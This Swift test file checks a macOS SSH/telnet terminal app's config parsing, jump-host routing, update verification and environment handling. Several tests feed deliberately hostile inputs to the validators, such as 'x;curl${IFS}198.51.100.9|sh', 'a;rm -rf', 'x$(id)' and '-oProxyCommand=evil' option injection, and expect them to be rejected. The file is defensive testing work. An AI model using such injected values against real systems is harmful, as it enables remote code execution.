import Foundation
import Testing
@testable import NetDeckCore

private let config = """
    # @grupo Saltos
    Host bastion
      HostName 192.0.2.1
      # @desc Salto principal
    # @grupo Core
    # @clave-grupo AD
    Host core-01 core-01b
      HostName=192.0.2.11
      Port = 2222
      ProxyJump bastion
    Host core-02
      HostName 192.0.2.12
      User admin
      ProxyCommand ssh -q -W %h:%p bastion
      # @clave admin-core
    Host olt-01
      HostName 192.0.2.21
      ProxyJump bastion
      # @telnet
    Host 192.0.2.*
      User nadie
    Host *
      User tu.usuario
      ServerAliveInterval 30
    """

@Suite struct SSHConfigParserTests {
    let profiles = SSHConfigParser().parse(config)

    @Test func aliasesConcretos() {
        #expect(profiles.map(\.name) == ["bastion", "core-01", "core-01b", "core-02", "olt-01"])
    }

    @Test func primerValorGanaYComodines() throws {
        let c = try #require(profiles.first { $0.name == "core-01" })
        #expect(c.hostName == "192.0.2.11")
        #expect(c.port == 2222)
        #expect(c.user == "tu.usuario")                       // de «Host *» (al final: el primer valor gana)
        #expect(c.proxyJump == ["bastion"])
        #expect(profiles.first { $0.name == "core-02" }?.user == "admin")
    }

    @Test func anotacionesDeNetDeck() {
        let by = Dictionary(uniqueKeysWithValues: profiles.map { ($0.name, $0) })
        #expect(by["bastion"]?.group == "Saltos")
        #expect(by["bastion"]?.summary == "Salto principal")
        #expect(by["core-01"]?.group == "Core")
        #expect(by["core-01"]?.namedCredential == "AD")           // la del grupo
        #expect(by["core-02"]?.namedCredential == "admin-core")   // la suya gana
        #expect(by["olt-01"]?.transport == .telnet)
    }

    @Test func proxyCommandComoSalto() {
        #expect(profiles.first { $0.name == "core-02" }?.proxyJump == ["bastion"])
    }

    @Test func endpoint() {
        #expect(Endpoint(parsing: "admin@192.0.2.1:2222") == Endpoint(user: "admin", host: "192.0.2.1", port: 2222))
        #expect(Endpoint(parsing: "-oProxyCommand=x") == nil)
        #expect(Endpoint(parsing: "fe80::1")?.port == nil)
        #expect(Endpoint(parsing: "a;rm -rf") == nil)
        #expect(Endpoint(parsing: "x$(id)")?.isShellSafe == false)
    }
}

@Suite @MainActor struct RouteTests {
    let manager = SessionManager(profiles: SSHConfigParser().parse(config))

    @Test func rutaDeSesionUsaElAlias() throws {
        let r = try manager.route(to: #require(manager.profile(named: "core-01")))
        #expect(r.jumps == [Endpoint(user: "tu.usuario", host: "192.0.2.1")])
        #expect(r.command.arguments == ["--", "core-01"])
    }

    @Test func accesoDirectoDeSaltoEscribeSshEnElSalto() throws {
        // sin -J: se abre el salto y en su prompt se escribe el ssh (vale aunque no deje reenviar puertos)
        let r = try manager.jumpShortcut(to: "admin@192.0.2.50:2222", via: "bastion")
        #expect(r.command.arguments == ["--", "bastion"])
        #expect(r.thenCommand == "ssh -p 2222 admin@192.0.2.50")
        #expect(r.thenUser == "admin")
        #expect(r.title == "192.0.2.50 ⟵ bastion")
        let t = try manager.jumpShortcut(to: "192.0.2.21", via: "bastion", transport: .telnet)
        #expect(t.thenCommand == "telnet 192.0.2.21")
        #expect(throws: RouteError.badDevice("x;reboot")) { try manager.jumpShortcut(to: "x;reboot", via: "bastion") }
    }

    @Test func sesionConProxyJumpEscritaEnElSalto() throws {
        let r = try manager.route(to: #require(manager.profile(named: "core-01")))
        let h = try #require(try manager.typedHop(for: r))
        #expect(h.command.arguments == ["--", "bastion"])
        #expect(h.thenCommand == "ssh -p 2222 tu.usuario@192.0.2.11")
        // (marcada como salto a mano: al clonarla o reabrirla, la contraseña del destino sigue sólo sugerida)
        #expect(h.manualHop == true && r.manualHop == nil)
        let reabierta = try JSONDecoder().decode(ConnectionRoute.self, from: JSONEncoder().encode(h))
        #expect(reabierta.manualHop == true)
    }

    @Test func telnetATravesDelSalto() throws {
        let r = try manager.route(to: #require(manager.profile(named: "olt-01")))
        #expect(r.command.arguments == ["-t", "--", "tu.usuario@192.0.2.1", "telnet", "192.0.2.21"])
    }

    @Test func conectarSinGuardarVaExplicito() throws {
        var s = EditableSession.new(group: "Core", name: "prueba-01")
        s.host = "198.51.100.7"
        s.user = "tu.usuario"
        s.port = "2200"
        s.jump = "bastion"
        let r = try manager.route(unsaved: s)
        #expect(r.alias == nil && r.sessionName == nil)
        #expect(r.command.arguments == ["-J", "tu.usuario@192.0.2.1", "-p", "2200", "-l", "tu.usuario", "--", "198.51.100.7"])
        // (sin salto: ssh directo; y nada que empiece por «-» llega como opción)
        s.jump = ""
        #expect(try manager.route(unsaved: s).command.arguments == ["-p", "2200", "-l", "tu.usuario", "--", "198.51.100.7"])
        s.host = "-oProxyCommand=evil"
        #expect(throws: RouteError.self) { try manager.route(unsaved: s) }
        // (telnet con salto: el equipo se escribe en la shell del salto)
        s.kind = .telnet
        s.jump = "bastion"
        s.host = "x;curl${IFS}198.51.100.9|sh"
        #expect(throws: RouteError.self) { try manager.route(unsaved: s) }
    }

    @Test func nadaEmpiezaPorGuionTrasLaArroba() {
        // («x@-oProxyCommand=…» era host «-oProxyCommand=…»: ssh lo leía como opción)
        for t in ["x@-oProxyCommand=evil", "-x@192.0.2.1", "x@-D1080", "-oProxyCommand=evil"] {
            #expect(Endpoint(parsing: t) == nil, "\(t)")
        }
        #expect(Endpoint(parsing: "tu.usuario@192.0.2.1:2222") == Endpoint(user: "tu.usuario", host: "192.0.2.1", port: 2222))
        // (y un salto a mano que lo intente, tampoco)
        let m = SessionManager(profiles: [SessionProfile(name: "x", hostName: "192.0.2.1", proxyJump: ["a@-oProxyCommand=evil"])])
        #expect(throws: RouteError.self) { try m.route(to: m.profile(named: "x")!) }
        #expect(throws: RouteError.self) { try m.jumpRoute("a@-oProxyCommand=evil") }
    }

    @Test func dobleGuionAntesDelDestino() throws {
        // (aunque algo empezara por «-», tras «--» ssh y sftp lo leen como destino)
        var r = ConnectionRoute(title: "x", target: Endpoint(user: "tu.usuario", host: "192.0.2.5", port: 2222))
        #expect(r.command.arguments == ["-p", "2222", "-l", "tu.usuario", "--", "192.0.2.5"])
        r.transport = .sftp
        #expect(r.command.arguments == ["-P", "2222", "--", "tu.usuario@192.0.2.5"])
        #expect(r.sftpSubsystemCommand?.arguments.suffix(3) == ["--", "192.0.2.5", "sftp"])
        // (el usuario de la orden se sigue leyendo bien con «--»)
        #expect(CommandLineUser.parse("$ ssh -p 2222 -l admin -- 192.0.2.5") == Endpoint(user: "admin", host: "192.0.2.5", port: 2222))
    }

    /// Sólo lo que escribe el propio ssh, al principio de la línea, cuenta como «el salto no deja reenviar».
    @Test func rechazoDelReenvioSoloElDeSsh() {
        #expect(ConnectionRoute.forwardingRefused(["channel 0: open failed: administratively prohibited: open failed"]))
        #expect(ConnectionRoute.forwardingRefused(["stdio forwarding failed", "Connection closed by UNKNOWN port 65535"]))
        // (un banner o un motd que lo cite en medio de una frase no)
        #expect(!ConnectionRoute.forwardingRefused(["Aviso: aquí -J da administratively prohibited, usa el salto a mano"]))
        #expect(!ConnectionRoute.forwardingRefused(["# stdio forwarding failed"]))
    }

    /// En la pestaña, sólo el destino: el camino completo va en la ayuda.
    @Test func tituloDeLaPestanaSoloElDestino() throws {
        var r = ConnectionRoute(title: "core-01 ⟵ bastion", target: Endpoint(user: "tu.usuario", host: "192.0.2.1"))
        r.thenCommand = "ssh tu.usuario@192.0.2.11"
        #expect(r.tabTitle(device: nil) == "core-01")
        #expect(r.tabTitle(device: "BASTION") == "BASTION")             // (aún en el salto: es donde se escribe)
        var s = ConnectionRoute(title: "core-01", target: Endpoint(host: "192.0.2.11"))
        s.sessionName = "core-01"
        #expect(s.tabTitle(device: "CORE-01") == "core-01")             // (el mismo, sin repetir)
        #expect(s.tabTitle(device: "192.0.2.11") == "core-01")
        #expect(s.tabTitle(device: "pe-mad-02") == "pe-mad-02")         // (saltado a mano a otro desde ahí)
        // (el hostname de la propia sesión, aunque no se llame como ella, no le quita el nombre)
        #expect(s.tabTitle(device: "PE-MAD-01", home: "PE-MAD-01") == "core-01")
        #expect(s.tabTitle(device: "pe-mad-02", home: "PE-MAD-01") == "pe-mad-02")
        #expect(s.tabTitle(device: "  ") == "core-01")
        var local = ConnectionRoute.local()
        local.title = "Terminal local"
        #expect(local.tabTitle(device: "mi-mac") == "Terminal local")
    }

    @Test func bucleDeSaltos() {
        let m = SessionManager(profiles: [SessionProfile(name: "a", proxyJump: ["b"]), SessionProfile(name: "b", proxyJump: ["a"])])
        #expect(throws: RouteError.loop("a")) { try m.route(to: m.profile(named: "a")!) }
    }

    @Test func nadaQueEmpiecepor_GuionLlegaComoOpcion() {
        let m = SessionManager()
        let malo = SSHConfigParser().parse("Host -oProxyCommand=evil\n  HostName 192.0.2.1\nHost x\n  HostName -oProxyCommand=evil\n")
        for p in malo { #expect(throws: RouteError.self) { try m.route(to: p) } }
        // (tampoco por un salto: la sesión del salto con un equipo que empieza por «-»)
        let salto = SessionManager(profiles: SSHConfigParser().parse(
            "Host malo\n  HostName -oProxyCommand=evil\nHost olt\n  HostName 192.0.2.21\n  ProxyJump malo\n  # @telnet\n"))
        #expect(throws: RouteError.badJump("malo")) { try salto.route(to: salto.profile(named: "olt")!) }
    }

    @Test func candidatasConSusDuenos() throws {
        let r = try manager.route(to: #require(manager.profile(named: "core-02")))
        let req = PasswordRequest(line: "admin@192.0.2.12's password:", account: "admin@192.0.2.12")
        let c = manager.credentialCandidates(for: req, route: r, defaultCredential: .init(name: "AD", user: "tu.usuario"))
        #expect(c.first?.ref == .named("admin-core"))              // la con nombre de la sesión, como NetDeck
        #expect(c.first?.owners == ["admin"])
        #expect(c[1].ref == .device("admin", "192.0.2.12"))
        #expect(c.last?.ref == .named("AD"))
    }
}

@Suite struct UpdateCheckTests {
    @Test func releaseConDmgYSuSha256() throws {
        let h = String(repeating: "ab", count: 32)
        let json = """
            {"tag_name":"v0.7.0","html_url":"https://github.com/usuario/repo/releases/tag/v0.7.0","assets":[
             {"browser_download_url":"https://github.com/usuario/repo/releases/download/v0.7.0/Terminal-NetDeck.dmg",
              "digest":"sha256:\(h.uppercased())"}]}
            """
        let r = try #require(UpdateCheck.parse(Data(json.utf8)))
        #expect(r.version == "0.7.0" && r.dmg != nil && r.sha256 == h)
        // (fuera de github.com o sin un sha256 válido no hay instalación automática)
        let otro = json.replacingOccurrences(of: "https://github.com/usuario/repo/releases/download", with: "https://example.com")
            .replacingOccurrences(of: "sha256:", with: "md5:")
        let r2 = try #require(UpdateCheck.parse(Data(otro.utf8)))
        #expect(r2.dmg == nil && r2.sha256 == nil)
    }

    @Test func compruebaLaAppBajada() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let app = dir.appendingPathComponent("Terminal NetDeck.app")
        try FileManager.default.createDirectory(at: app.appendingPathComponent("Contents"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        #expect(UpdateCheck.validate(app: app, bundleID: "io.netdeck.terminal", version: "0.7.0") != nil)
        (["CFBundleIdentifier": "io.netdeck.terminal", "CFBundleShortVersionString": "0.7.0"] as NSDictionary)
            .write(to: app.appendingPathComponent("Contents/Info.plist"), atomically: true)
        #expect(UpdateCheck.validate(app: app, bundleID: "io.netdeck.terminal", version: "0.7.0") == nil)
        #expect(UpdateCheck.validate(app: app, bundleID: "io.netdeck.terminal", version: "0.8.0") != nil)
        #expect(UpdateCheck.validate(app: app, bundleID: "otra.app", version: "0.7.0") != nil)
        let f = dir.appendingPathComponent("x")
        try Data("abc".utf8).write(to: f)
        #expect(try UpdateCheck.sha256(of: f) == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
    }

    @Test func sinReleasesValenLosTags() {
        let json = #"[{"name":"v0.4.0"},{"name":"v0.10.1"},{"name":"prueba"},{"name":"0.9"}]"#
        let r = UpdateCheck.parseTags(Data(json.utf8), repo: "usuario/repo")
        #expect(r?.version == "0.10.1")
        #expect(r?.page.absoluteString == "https://github.com/usuario/repo/releases")
        #expect(UpdateCheck.parseTags(Data("[]".utf8), repo: "usuario/repo") == nil)
    }

    @Test func versionesPorNumeros() {
        #expect(UpdateCheck.isNewer("0.10.0", than: "0.4.1"))
        #expect(UpdateCheck.isNewer("0.4.1", than: "0.4"))
        #expect(!UpdateCheck.isNewer("0.4.0", than: "0.4"))
        #expect(!UpdateCheck.isNewer("0.3.9", than: "0.4.0"))
    }

    @Test func releaseDeGitHub() throws {
        let json = #"{"tag_name":"v0.5.0","html_url":"https://github.com/u/r/releases/tag/v0.5.0","assets":[{"browser_download_url":"https://github.com/u/r/releases/download/v0.5.0/Terminal-NetDeck.dmg"}]}"#
        let r = try #require(UpdateCheck.parse(Data(json.utf8)))
        #expect(r.version == "0.5.0")
        #expect(r.dmg?.lastPathComponent == "Terminal-NetDeck.dmg")
        #expect(UpdateCheck.parse(Data(#"{"tag_name":"v1","html_url":"http://x"}"#.utf8)) == nil)   // sólo https
    }
}

@Suite struct LoopbackTests {
    @Test func lasDeEsteMacNoSeReabren() throws {
        func ruta(_ s: String, saltos: [String] = []) throws -> ConnectionRoute {
            ConnectionRoute(title: s, target: try #require(Endpoint(parsing: s)),
                            jumps: saltos.compactMap(Endpoint.init(parsing:)), transport: .ssh)
        }
        #expect(try ruta("127.0.0.1").isLoopback)
        #expect(try ruta("admin@127.0.0.3").isLoopback)
        #expect(try ruta("localhost").isLoopback)
        #expect(try !ruta("192.0.2.1").isLoopback)
        #expect(try !ruta("127.0.0.1", saltos: ["bastion"]).isLoopback)      // (detrás de un salto es otro equipo)
    }
}

@Suite struct TerminalEnvironmentTests {
    let mac = ["LANG": "es_ES.UTF-8", "LC_CTYPE": "es_ES.UTF-8", "LC_ALL": "es_ES.UTF-8", "HOME": "/Users/x"]

    @Test func aSshNoLeLlegaElIdiomaDelMac() {
        let e = TerminalEnvironment.prepare(mac, forSSH: true, sendLocale: false)
        #expect(e["LANG"] == nil && e["LC_ALL"] == nil)
        // (sólo UTF-8 neutro: sin él, ssh escribe los acentos de los banners en octal)
        #expect(e["LC_CTYPE"] == "C.UTF-8")
        #expect(e["HOME"] == "/Users/x" && e["TERM"] == "xterm-256color")
    }

    @Test func siLoPidesSiYEnLocalSeQueda() {
        #expect(TerminalEnvironment.prepare(mac, forSSH: true, sendLocale: true)["LC_CTYPE"] == "es_ES.UTF-8")
        #expect(TerminalEnvironment.prepare(mac, forSSH: false, sendLocale: false)["LANG"] == "es_ES.UTF-8")
        #expect(TerminalEnvironment.prepare([:], forSSH: false, sendLocale: false)["LANG"] == "en_US.UTF-8")
    }
}

@Suite struct LocalTerminalTests {
    @Test func laLocalEsUnaShellDeLoginYSeReabre() throws {
        let r = ConnectionRoute.local(shell: "/bin/bash", allowed: ["/bin/zsh", "/bin/bash"])
        #expect(r.isLocal)
        #expect(r.localShell == "/bin/bash")
        #expect(!r.isLoopback)                                           // (no es un ssh a este Mac: se guarda)
        #expect(r.sessionName == nil && r.jumps.isEmpty)
        // (una shell que no está en /etc/shells, o ninguna: /bin/zsh)
        #expect(ConnectionRoute.local(shell: "/tmp/x", allowed: ["/bin/zsh"]).localShell == "/bin/zsh")
        #expect(ConnectionRoute.local(shell: nil, allowed: []).localShell == "/bin/zsh")
        #expect(ConnectionRoute.loginShell("/bin/zsh", allowed: []) == "/bin/zsh")
        // (guardada en abiertas.json y leída de vuelta, sigue siendo local y de login)
        let back = try JSONDecoder().decode(ConnectionRoute.self, from: JSONEncoder().encode(r))
        #expect(back.isLocal && back.command.arguments == ["-l"])
        // (las guardadas antes, sin el campo, se siguen leyendo como remotas)
        let ssh = ConnectionRoute(title: "core-01", target: Endpoint(host: "192.0.2.11"))
        let old = #"{"title":"core-01","target":{"host":"192.0.2.11"},"jumps":[],"transport":"ssh"}"#
        #expect(try !JSONDecoder().decode(ConnectionRoute.self, from: Data(old.utf8)).isLocal)
        #expect(ssh.command.executable == "/usr/bin/ssh")
    }
}
